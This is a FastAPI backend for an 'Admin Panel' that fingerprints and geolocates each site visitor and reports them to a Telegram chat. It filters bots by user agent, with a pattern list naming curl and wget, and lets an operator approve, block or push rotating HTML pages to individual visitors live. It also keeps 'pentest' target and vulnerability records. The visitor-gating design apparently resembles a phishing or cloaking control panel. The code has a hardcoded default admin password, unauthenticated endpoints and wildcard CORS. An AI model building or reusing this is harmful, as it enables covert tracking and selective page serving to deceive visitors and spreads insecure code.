from fastapi import FastAPI, APIRouter, WebSocket, WebSocketDisconnect, HTTPException, Request
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os, logging, uuid, asyncio
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List, Optional, Dict
from datetime import datetime, timezone
import httpx
import re

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

app = FastAPI()
api_router = APIRouter(prefix="/api")
logger = logging.getLogger(__name__)

# ── WebSocket Manager ────────────────────────────────────────────────────────
class ConnectionManager:
    def __init__(self):
        self.admin_connections: List[WebSocket] = []
        self.visitor_connections: Dict[str, WebSocket] = {}

    async def connect_admin(self, ws: WebSocket):
        await ws.accept()
        self.admin_connections.append(ws)

    def disconnect_admin(self, ws: WebSocket):
        if ws in self.admin_connections:
            self.admin_connections.remove(ws)

    async def connect_visitor(self, session_id: str, ws: WebSocket):
        await ws.accept()
        self.visitor_connections[session_id] = ws

    def disconnect_visitor(self, session_id: str):
        self.visitor_connections.pop(session_id, None)

    async def broadcast_admins(self, data: dict):
        dead = []
        for ws in self.admin_connections:
            try:
                await ws.send_json(data)
            except Exception:
                dead.append(ws)
        for ws in dead:
            self.admin_connections.remove(ws)

    async def notify_visitor(self, session_id: str, data: dict):
        ws = self.visitor_connections.get(session_id)
        if ws:
            try:
                await ws.send_json(data)
            except Exception:
                self.visitor_connections.pop(session_id, None)

manager = ConnectionManager()

# ── Bot Detection ─────────────────────────────────────────────────────────────
BOT_PATTERNS = [
    'bot', 'crawler', 'spider', 'scraper', 'python-requests', 'python-urllib',
    'curl/', 'wget/', 'httpie/', 'go-http', 'java/', 'ruby', 'perl/',
    'scrapy', 'mechanize', 'selenium', 'phantomjs', 'headless',
    'postman', 'insomnia', 'httpclient', 'okhttp', 'libwww', 'node-fetch',
]

def detect_bot(user_agent: str) -> tuple:
    if not user_agent or len(user_agent) < 10:
        return True, 0.9
    ua_lower = user_agent.lower()
    for pattern in BOT_PATTERNS:
        if pattern in ua_lower:
            return True, 0.85
    return False, 0.0

# ── Geolocation ───────────────────────────────────────────────────────────────
async def get_geo(ip: str) -> dict:
    if ip in ('127.0.0.1', 'localhost', '::1', ''):
        return {'country': 'Localhost', 'city': 'Local', 'lat': 0.0, 'lng': 0.0, 'isp': 'Local'}
    try:
        async with httpx.AsyncClient(timeout=4.0) as c:
            r = await c.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp")
            d = r.json()
            if d.get('status') == 'success':
                return {
                    'country': d.get('country', ''),
                    'city': d.get('city', ''),
                    'lat': float(d.get('lat', 0)),
                    'lng': float(d.get('lon', 0)),
                    'isp': d.get('isp', '')
                }
    except Exception:
        pass
    return {'country': 'Unknown', 'city': 'Unknown', 'lat': 0.0, 'lng': 0.0, 'isp': 'Unknown'}

# ── Telegram ──────────────────────────────────────────────────────────────────
async def send_telegram(msg: str):
    token = os.environ.get('TELEGRAM_BOT_TOKEN', '')
    chat_id = os.environ.get('TELEGRAM_CHAT_ID', '')
    if not token or not chat_id:
        return
    try:
        async with httpx.AsyncClient(timeout=10.0) as c:
            await c.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"}
            )
    except Exception as e:
        logger.warning(f"Telegram error: {e}")

# ── Helpers ───────────────────────────────────────────────────────────────────
def now_iso():
    return datetime.now(timezone.utc).isoformat()

async def create_alert(type_: str, msg: str, severity: str = "info"):
    alert = {
        "id": str(uuid.uuid4()),
        "type": type_,
        "message": msg,
        "severity": severity,
        "read": False,
        "created_at": now_iso()
    }
    await db.alerts.insert_one(alert)
    safe = {k: v for k, v in alert.items() if k != '_id'}
    await manager.broadcast_admins({"event": "new_alert", "alert": safe})
    return safe

# ── Pydantic Models ───────────────────────────────────────────────────────────
class AdminAuth(BaseModel):
    password: str

class VisitorRegister(BaseModel):
    session_id: str
    user_agent: str
    screen_width: Optional[int] = 0
    screen_height: Optional[int] = 0
    timezone: Optional[str] = ""
    languages: Optional[str] = ""

class VisitorAction(BaseModel):
    page_id: Optional[str] = None

class PageRotationRequest(BaseModel):
    page_ids: List[str]
    interval_ms: int = 5000

class PageCreate(BaseModel):
    name: str
    content: str
    is_default: bool = False

class PageUpdate(BaseModel):
    name: Optional[str] = None
    content: Optional[str] = None
    is_default: Optional[bool] = None

class TargetCreate(BaseModel):
    host: str
    description: str = ""
    ports: str = ""
    status: str = "active"

class ScanCreate(BaseModel):
    target_id: str
    scan_type: str
    results: str = ""
    notes: str = ""
    status: str = "pending"

class ScanUpdate(BaseModel):
    scan_type: Optional[str] = None
    results: Optional[str] = None
    notes: Optional[str] = None
    status: Optional[str] = None

class VulnCreate(BaseModel):
    target_id: str
    title: str
    severity: str = "medium"
    description: str = ""
    cvss: float = 0.0
    status: str = "open"

class AlertCreate(BaseModel):
    type: str
    message: str
    severity: str = "info"

# ── Auth ──────────────────────────────────────────────────────────────────────
@api_router.post("/auth/admin")
async def admin_login(body: AdminAuth):
    if body.password != os.environ.get('ADMIN_PASSWORD', 'University@007'):
        raise HTTPException(status_code=401, detail="Invalid password")
    return {"success": True}

# ── Visitors ──────────────────────────────────────────────────────────────────
@api_router.post("/visitors/register")
async def register_visitor(body: VisitorRegister, request: Request):
    forwarded = request.headers.get("x-forwarded-for")
    ip = forwarded.split(",")[0].strip() if forwarded else (request.client.host or "")

    existing = await db.visitors.find_one({"session_id": body.session_id}, {"_id": 0})
    if existing:
        await db.visitors.update_one({"session_id": body.session_id}, {"$set": {"last_seen": now_iso()}})
        return existing

    is_bot, bot_score = detect_bot(body.user_agent)
    geo = await get_geo(ip)

    visitor = {
        "id": str(uuid.uuid4()),
        "session_id": body.session_id,
        "ip": ip,
        "country": geo['country'],
        "city": geo['city'],
        "lat": geo['lat'],
        "lng": geo['lng'],
        "isp": geo['isp'],
        "user_agent": body.user_agent,
        "screen": f"{body.screen_width}x{body.screen_height}",
        "timezone": body.timezone,
        "languages": body.languages,
        "status": "pending",
        "page_id": None,
        "is_bot": is_bot,
        "bot_score": bot_score,
        "created_at": now_iso(),
        "last_seen": now_iso()
    }

    await db.visitors.insert_one({**visitor})
    await manager.broadcast_admins({"event": "new_visitor", "visitor": visitor})

    bot_label = " [BOT DETECTED]" if is_bot else ""
    await send_telegram(
        f"<b>New Visitor{bot_label}</b>\n"
        f"IP: <code>{ip}</code>\n"
        f"Location: {geo['city']}, {geo['country']}\n"
        f"ISP: {geo['isp']}\n"
        f"UA: {body.user_agent[:80]}"
    )
    await create_alert(
        "visitor",
        f"New visitor from {geo['city']}, {geo['country']} ({ip}){bot_label}",
        "warning" if is_bot else "info"
    )
    return visitor

@api_router.get("/visitors")
async def get_visitors():
    visitors = await db.visitors.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
    return visitors

@api_router.put("/visitors/{visitor_id}/approve")
async def approve_visitor(visitor_id: str, body: VisitorAction):
    visitor = await db.visitors.find_one({"id": visitor_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Visitor not found")

    update_data: dict = {"status": "approved", "last_seen": now_iso()}
    if body.page_id:
        update_data["page_id"] = body.page_id

    await db.visitors.update_one({"id": visitor_id}, {"$set": update_data})

    # Get page content
    page_content = None
    pid = body.page_id or visitor.get("page_id")
    if pid:
        page = await db.pages.find_one({"id": pid}, {"_id": 0})
    else:
        page = await db.pages.find_one({"is_default": True}, {"_id": 0})
    if page:
        page_content = page.get("content")

    await manager.notify_visitor(visitor["session_id"], {"event": "approved", "page_content": page_content})
    await manager.broadcast_admins({"event": "visitor_updated", "visitor_id": visitor_id, "status": "approved"})
    await send_telegram(f"<b>Visitor Approved</b>\nIP: <code>{visitor['ip']}</code>\nLocation: {visitor['city']}, {visitor['country']}")
    await create_alert("visitor", f"Visitor {visitor['ip']} approved", "info")
    return {"success": True}

@api_router.put("/visitors/{visitor_id}/approve/rotate")
async def approve_visitor_with_rotation(visitor_id: str, body: PageRotationRequest):
    """
    Approve a visitor and start page rotation through multiple pages.
    Supports up to 6 pages that rotate at specified intervals.
    """
    visitor = await db.visitors.find_one({"id": visitor_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Visitor not found")
    
    if not body.page_ids or len(body.page_ids) < 2 or len(body.page_ids) > 6:
        raise HTTPException(status_code=400, detail="Must provide 2-6 page IDs")
    
    # Verify all pages exist
    for page_id in body.page_ids:
        page = await db.pages.find_one({"id": page_id}, {"_id": 0})
        if not page:
            raise HTTPException(status_code=404, detail=f"Page {page_id} not found")
    
    # Update visitor with rotation info
    update_data = {
        "status": "approved",
        "last_seen": now_iso(),
        "rotation_pages": body.page_ids,
        "rotation_interval": body.interval_ms,
        "current_page_index": 0,
        "is_rotating": True
    }
    
    await db.visitors.update_one({"id": visitor_id}, {"$set": update_data})
    
    # Get first page content
    page = await db.pages.find_one({"id": body.page_ids[0]}, {"_id": 0})
    page_content = page.get("content") if page else None
    
    # Notify visitor of approval with rotation mode
    await manager.notify_visitor(visitor["session_id"], {
        "event": "approved",
        "page_content": page_content,
        "rotation_mode": True,
        "page_ids": body.page_ids,
        "interval_ms": body.interval_ms,
        "current_page_index": 0
    })
    
    await manager.broadcast_admins({
        "event": "visitor_updated",
        "visitor_id": visitor_id,
        "status": "approved",
        "rotation_mode": True
    })
    
    await send_telegram(f"<b>Visitor Approved (Rotation)</b>\nIP: <code>{visitor['ip']}</code>\nPages: {len(body.page_ids)} (rotating every {body.interval_ms}ms)")
    await create_alert("visitor", f"Visitor {visitor['ip']} approved with rotation ({len(body.page_ids)} pages)", "info")
    
    return {"success": True, "rotation_mode": True, "pages": len(body.page_ids)}


@api_router.put("/visitors/{visitor_id}/rotation/next")
async def rotate_to_next_page(visitor_id: str):
    """Manually advance to the next page in rotation."""
    visitor = await db.visitors.find_one({"id": visitor_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Visitor not found")
    
    if not visitor.get("is_rotating"):
        raise HTTPException(status_code=400, detail="Visitor is not in rotation mode")
    
    rotation_pages = visitor.get("rotation_pages", [])
    current_index = visitor.get("current_page_index", 0)
    next_index = (current_index + 1) % len(rotation_pages)
    
    # Update current index
    await db.visitors.update_one(
        {"id": visitor_id},
        {"$set": {"current_page_index": next_index, "last_seen": now_iso()}}
    )
    
    # Get next page content
    next_page_id = rotation_pages[next_index]
    page = await db.pages.find_one({"id": next_page_id}, {"_id": 0})
    page_content = page.get("content") if page else None
    
    # Notify visitor of page change
    await manager.notify_visitor(visitor["session_id"], {
        "event": "rotate_page",
        "page_content": page_content,
        "page_index": next_index,
        "total_pages": len(rotation_pages)
    })
    
    return {"success": True, "page_index": next_index, "total_pages": len(rotation_pages)}


@api_router.put("/visitors/{visitor_id}/rotation/stop")
async def stop_page_rotation(visitor_id: str):
    """Stop page rotation and keep visitor on current page."""
    visitor = await db.visitors.find_one({"id": visitor_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Visitor not found")
    
    # Update rotation status
    await db.visitors.update_one(
        {"id": visitor_id},
        {"$set": {
            "is_rotating": False,
            "rotation_pages": None,
            "current_page_index": 0,
            "last_seen": now_iso()
        }}
    )
    
    # Get current page to freeze it
    current_index = visitor.get("current_page_index", 0)
    rotation_pages = visitor.get("rotation_pages", [])
    
    if rotation_pages and current_index < len(rotation_pages):
        page_id = rotation_pages[current_index]
        page = await db.pages.find_one({"id": page_id}, {"_id": 0})
        page_content = page.get("content") if page else None
    else:
        page_content = None
    
    # Notify visitor to stop rotation
    await manager.notify_visitor(visitor["session_id"], {
        "event": "stop_rotation",
        "page_content": page_content
    })
    
    await manager.broadcast_admins({
        "event": "visitor_updated",
        "visitor_id": visitor_id,
        "status": "approved",
        "rotation_mode": False
    })
    
    await create_alert("visitor", f"Visitor {visitor['ip']} rotation stopped", "info")
    
    return {"success": True}

@api_router.put("/visitors/{visitor_id}/block")
async def block_visitor(visitor_id: str):
    visitor = await db.visitors.find_one({"id": visitor_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Visitor not found")

    await db.visitors.update_one({"id": visitor_id}, {"$set": {"status": "blocked", "last_seen": now_iso()}})
    await manager.notify_visitor(visitor["session_id"], {"event": "blocked"})
    await manager.broadcast_admins({"event": "visitor_updated", "visitor_id": visitor_id, "status": "blocked"})
    await send_telegram(f"<b>Visitor Blocked</b>\nIP: <code>{visitor['ip']}</code>\nLocation: {visitor['city']}, {visitor['country']}")
    await create_alert("visitor", f"Visitor {visitor['ip']} blocked", "warning")
    return {"success": True}

@api_router.delete("/visitors/{visitor_id}")
async def delete_visitor(visitor_id: str):
    await db.visitors.delete_one({"id": visitor_id})
    await manager.broadcast_admins({"event": "visitor_deleted", "visitor_id": visitor_id})
    return {"success": True}

@api_router.get("/visitors/{session_id}/status")
async def get_visitor_status(session_id: str):
    visitor = await db.visitors.find_one({"session_id": session_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Not found")
    result: dict = {"status": visitor["status"]}
    if visitor["status"] == "approved":
        pid = visitor.get("page_id")
        page = await db.pages.find_one({"id": pid}, {"_id": 0}) if pid else await db.pages.find_one({"is_default": True}, {"_id": 0})
        if page:
            result["page_content"] = page.get("content")
    return result

# ── Pages ─────────────────────────────────────────────────────────────────────
@api_router.get("/pages/default")
async def get_default_page():
    page = await db.pages.find_one({"is_default": True}, {"_id": 0})
    if not page:
        return {"content": None}
    return page

@api_router.get("/pages")
async def get_pages():
    pages = await db.pages.find({}, {"_id": 0, "content": 0}).sort("created_at", -1).to_list(100)
    return pages

@api_router.get("/pages/{page_id}")
async def get_page(page_id: str):
    page = await db.pages.find_one({"id": page_id}, {"_id": 0})
    if not page:
        raise HTTPException(status_code=404, detail="Page not found")
    return page

@api_router.post("/pages")
async def create_page(body: PageCreate):
    if body.is_default:
        await db.pages.update_many({}, {"$set": {"is_default": False}})
    page = {
        "id": str(uuid.uuid4()),
        "name": body.name,
        "content": body.content,
        "is_default": body.is_default,
        "created_at": now_iso(),
        "updated_at": now_iso()
    }
    await db.pages.insert_one(page)
    await create_alert("system", f"New page created: {body.name}", "info")
    return {k: v for k, v in page.items() if k != '_id'}

@api_router.put("/pages/{page_id}")
async def update_page(page_id: str, body: PageUpdate):
    update_data: dict = {"updated_at": now_iso()}
    if body.name is not None:
        update_data["name"] = body.name
    if body.content is not None:
        update_data["content"] = body.content
    if body.is_default is not None:
        if body.is_default:
            await db.pages.update_many({}, {"$set": {"is_default": False}})
        update_data["is_default"] = body.is_default
    await db.pages.update_one({"id": page_id}, {"$set": update_data})
    page = await db.pages.find_one({"id": page_id}, {"_id": 0})
    return page

@api_router.delete("/pages/{page_id}")
async def delete_page(page_id: str):
    await db.pages.delete_one({"id": page_id})
    return {"success": True}

# ── Targets ───────────────────────────────────────────────────────────────────
@api_router.get("/targets")
async def get_targets():
    return await db.targets.find({}, {"_id": 0}).sort("created_at", -1).to_list(100)

@api_router.post("/targets")
async def create_target(body: TargetCreate):
    target = {
        "id": str(uuid.uuid4()),
        "host": body.host,
        "description": body.description,
        "ports": body.ports,
        "status": body.status,
        "created_at": now_iso()
    }
    await db.targets.insert_one(target)
    await create_alert("pentest", f"New target: {body.host}", "warning")
    await send_telegram(f"<b>New Pentest Target</b>\nHost: <code>{body.host}</code>\nDesc: {body.description}")
    return {k: v for k, v in target.items() if k != '_id'}

@api_router.put("/targets/{target_id}")
async def update_target(target_id: str, body: TargetCreate):
    await db.targets.update_one({"id": target_id}, {"$set": body.model_dump()})
    return await db.targets.find_one({"id": target_id}, {"_id": 0})

@api_router.delete("/targets/{target_id}")
async def delete_target(target_id: str):
    await db.targets.delete_one({"id": target_id})
    await db.scans.delete_many({"target_id": target_id})
    await db.vulnerabilities.delete_many({"target_id": target_id})
    return {"success": True}

# ── Scans ─────────────────────────────────────────────────────────────────────
@api_router.get("/scans")
async def get_scans(target_id: Optional[str] = None):
    q = {"target_id": target_id} if target_id else {}
    return await db.scans.find(q, {"_id": 0}).sort("started_at", -1).to_list(200)

@api_router.post("/scans")
async def create_scan(body: ScanCreate):
    scan = {
        "id": str(uuid.uuid4()),
        "target_id": body.target_id,
        "scan_type": body.scan_type,
        "status": body.status,
        "results": body.results,
        "notes": body.notes,
        "started_at": now_iso(),
        "completed_at": None
    }
    await db.scans.insert_one(scan)
    await create_alert("pentest", f"New {body.scan_type} scan initiated", "warning")
    return {k: v for k, v in scan.items() if k != '_id'}

@api_router.put("/scans/{scan_id}")
async def update_scan(scan_id: str, body: ScanUpdate):
    update: dict = {}
    if body.scan_type: update["scan_type"] = body.scan_type
    if body.results is not None: update["results"] = body.results
    if body.notes is not None: update["notes"] = body.notes
    if body.status: update["status"] = body.status
    if body.status == "completed": update["completed_at"] = now_iso()
    await db.scans.update_one({"id": scan_id}, {"$set": update})
    return await db.scans.find_one({"id": scan_id}, {"_id": 0})

@api_router.delete("/scans/{scan_id}")
async def delete_scan(scan_id: str):
    await db.scans.delete_one({"id": scan_id})
    return {"success": True}

# ── Vulnerabilities ───────────────────────────────────────────────────────────
@api_router.get("/vulnerabilities")
async def get_vulns(target_id: Optional[str] = None):
    q = {"target_id": target_id} if target_id else {}
    return await db.vulnerabilities.find(q, {"_id": 0}).sort("created_at", -1).to_list(200)

@api_router.post("/vulnerabilities")
async def create_vuln(body: VulnCreate):
    vuln = {
        "id": str(uuid.uuid4()),
        "target_id": body.target_id,
        "title": body.title,
        "severity": body.severity,
        "description": body.description,
        "cvss": body.cvss,
        "status": body.status,
        "created_at": now_iso()
    }
    await db.vulnerabilities.insert_one(vuln)
    sev = "critical" if body.severity in ["critical", "high"] else "warning"
    await create_alert("pentest", f"[{body.severity.upper()}] {body.title}", sev)
    await send_telegram(f"<b>Vulnerability Found</b>\nSeverity: {body.severity.upper()}\nTitle: {body.title}")
    return {k: v for k, v in vuln.items() if k != '_id'}

@api_router.put("/vulnerabilities/{vuln_id}")
async def update_vuln(vuln_id: str, body: VulnCreate):
    await db.vulnerabilities.update_one({"id": vuln_id}, {"$set": body.model_dump()})
    return await db.vulnerabilities.find_one({"id": vuln_id}, {"_id": 0})

@api_router.delete("/vulnerabilities/{vuln_id}")
async def delete_vuln(vuln_id: str):
    await db.vulnerabilities.delete_one({"id": vuln_id})
    return {"success": True}

# ── Alerts ────────────────────────────────────────────────────────────────────
@api_router.get("/alerts")
async def get_alerts():
    return await db.alerts.find({}, {"_id": 0}).sort("created_at", -1).to_list(200)

@api_router.post("/alerts")
async def post_alert(body: AlertCreate):
    return await create_alert(body.type, body.message, body.severity)

@api_router.put("/alerts/read-all")
async def mark_all_read():
    await db.alerts.update_many({}, {"$set": {"read": True}})
    return {"success": True}

@api_router.put("/alerts/{alert_id}/read")
async def mark_alert_read(alert_id: str):
    await db.alerts.update_one({"id": alert_id}, {"$set": {"read": True}})
    return {"success": True}

@api_router.delete("/alerts/{alert_id}")
async def delete_alert(alert_id: str):
    await db.alerts.delete_one({"id": alert_id})
    return {"success": True}

# ── Stats ─────────────────────────────────────────────────────────────────────
@api_router.get("/stats")
async def get_stats():
    tv = await db.visitors.count_documents({})
    pending = await db.visitors.count_documents({"status": "pending"})
    approved = await db.visitors.count_documents({"status": "approved"})
    blocked = await db.visitors.count_documents({"status": "blocked"})
    bots = await db.visitors.count_documents({"is_bot": True})
    tt = await db.targets.count_documents({})
    at = await db.targets.count_documents({"status": "active"})
    ts = await db.scans.count_documents({})
    tv2 = await db.vulnerabilities.count_documents({})
    cv = await db.vulnerabilities.count_documents({"severity": "critical"})
    ua = await db.alerts.count_documents({"read": False})
    online = len(manager.visitor_connections)
    return {
        "visitors": {"total": tv, "pending": pending, "approved": approved, "blocked": blocked, "bots": bots, "online": online},
        "pentest": {"targets": tt, "active_targets": at, "scans": ts, "vulnerabilities": tv2, "critical": cv},
        "alerts": {"unread": ua}
    }

@api_router.get("/telegram/test")
async def test_telegram():
    await send_telegram("<b>Test Notification</b>\nAdmin Panel v2.1 — connection verified.")
    return {"success": True}

# ── Root ──────────────────────────────────────────────────────────────────────
@api_router.get("/")
async def root():
    return {"message": "Admin Panel API v2.1", "status": "online"}

# ── WebSockets ────────────────────────────────────────────────────────────────
@app.websocket("/api/ws/admin")
async def ws_admin(ws: WebSocket):
    await manager.connect_admin(ws)
    try:
        while True:
            data = await ws.receive_text()
            if data == "ping":
                await ws.send_text("pong")
    except WebSocketDisconnect:
        manager.disconnect_admin(ws)

@app.websocket("/api/ws/visitor/{session_id}")
async def ws_visitor(ws: WebSocket, session_id: str):
    await manager.connect_visitor(session_id, ws)
    # Broadcast updated online count to admins
    await manager.broadcast_admins({"event": "visitor_online", "session_id": session_id, "online": len(manager.visitor_connections)})
    try:
        while True:
            data = await ws.receive_text()
            if data == "ping":
                await ws.send_text("pong")
    except WebSocketDisconnect:
        manager.disconnect_visitor(session_id)
        await manager.broadcast_admins({"event": "visitor_offline", "session_id": session_id, "online": len(manager.visitor_connections)})

app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

DEFAULT_PAGE_HTML = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#000;color:#00ff88;font-family:'Courier New',monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden;}
.wrap{max-width:640px;width:90%;padding:2rem;}
.logo{font-size:0.7rem;color:#003319;line-height:1.2;margin-bottom:2rem;white-space:pre;}
h1{font-size:1.1rem;color:#00ff88;letter-spacing:0.3em;text-transform:uppercase;margin-bottom:0.5rem;}
.sub{color:#005533;font-size:0.8rem;margin-bottom:2rem;letter-spacing:0.1em;}
.line{font-size:0.85rem;color:#00cc66;margin:0.4rem 0;display:flex;align-items:center;gap:0.5rem;}
.dot{width:6px;height:6px;background:#00ff88;border-radius:50%;animation:pulse 2s infinite;}
@keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.3;}}
.cursor{animation:blink 1s step-end infinite;color:#00ff88;}
@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
.bar-wrap{margin-top:2rem;border:1px solid #003319;padding:1px;}
.bar{height:3px;background:linear-gradient(90deg,#00ff88,#00cc66);width:100%;animation:scan 3s linear infinite;}
@keyframes scan{0%{width:0%;}100%{width:100%;}}
</style>
</head>
<body>
<div class="wrap">
<div class="logo">    _____                            __        __
   / ___/___  _______  __________  / /  ___ _/ /
  / /__/ _ \\/ __/ _ \\/ __/ __/ /_/ _ \\/ _ `/ /
  \\___/\\___/_/  \\___/\\__/\\__/\\__/_.__/\\_,_/_/</div>
<h1>Secure Portal</h1>
<div class="sub">Connection Established &mdash; Session Authenticated</div>
<div class="line"><span class="dot"></span> Identity verification: PASSED</div>
<div class="line"><span class="dot"></span> Encryption layer: AES-256-GCM active</div>
<div class="line"><span class="dot"></span> Access level: GRANTED</div>
<div class="line"><span class="dot"></span> Session token: ••••••••••••••••</div>
<div class="bar-wrap"><div class="bar"></div></div>
<div style="margin-top:1.5rem;color:#003319;font-size:0.75rem;">
This portal is authorized for approved personnel only. All activity is monitored and logged.<span class="cursor"> _</span>
</div>
</div>
</body></html>"""

@app.on_event("startup")
async def startup():
    count = await db.pages.count_documents({})
    if count == 0:
        page = {
            "id": str(uuid.uuid4()),
            "name": "Default Visitor Page",
            "content": DEFAULT_PAGE_HTML,
            "is_default": True,
            "created_at": now_iso(),
            "updated_at": now_iso()
        }
        await db.pages.insert_one(page)
        logger.info("Default page seeded")

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
